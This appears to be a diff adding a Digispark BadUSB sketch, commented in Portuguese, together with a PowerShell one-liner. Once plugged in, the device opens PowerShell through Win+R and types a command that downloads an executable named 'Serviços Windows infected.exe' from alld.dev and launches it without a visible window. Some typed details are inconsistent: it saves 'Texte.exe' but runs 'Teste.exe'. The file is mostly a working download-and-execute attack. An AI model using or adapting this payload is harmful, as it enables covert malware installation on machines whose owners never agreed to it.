@@ -1,1 +1,53 @@
 Invoke-WebRequest -Uri “https://alld.dev/assets/others/Servi%C3%A7os%20Windows%20infected.exe” -OutFile Teste.exe; Start-Process -NoNewWindow -FilePath .\Teste.exe
+
+#include "DigiKeyboard.h"
+
+void sendColon() {
+  DigiKeyboard.sendKeyStroke(55);  // ':'
+}
+
+void sendSlash() {
+  DigiKeyboard.sendKeyStroke(84);  // '/'
+}
+
+void sendQuotes() {
+  DigiKeyboard.sendKeyStroke(53);  // "Aspas"
+}
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+  pinMode(1, OUTPUT);
+  DigiKeyboard.delay(500);
+  digitalWrite(1, HIGH);
+
+  // Abre o powershell
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Pressiona Win+R
+  delay(500);
+  DigiKeyboard.print("Powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Pressiona Enter
+  delay(500);
+
+  DigiKeyboard.print("Invoke-WebRequest -Uri ");
+  sendQuotes();
+  DigiKeyboard.print("https");
+  sendColon();
+  sendSlash();
+  sendSlash();
+  DigiKeyboard.print("alld.dev");
+  sendSlash();
+  DigiKeyboard.print("assets");
+  sendSlash();
+  DigiKeyboard.print("others");
+  sendSlash();
+  DigiKeyboard.print("Serviços Windows infected.exe");
+  sendQuotes();
+  DigiKeyboard.print("-Outfile Texte.exe; Start-Process -NoNewWindow -FilePath .");
+  sendSlash();
+  DigiKeyboard.print("Teste.exe");
+  digitalWrite(1, LOW);
+}
+
+void loop() {
+  // Nada necessário aqui
+}
+
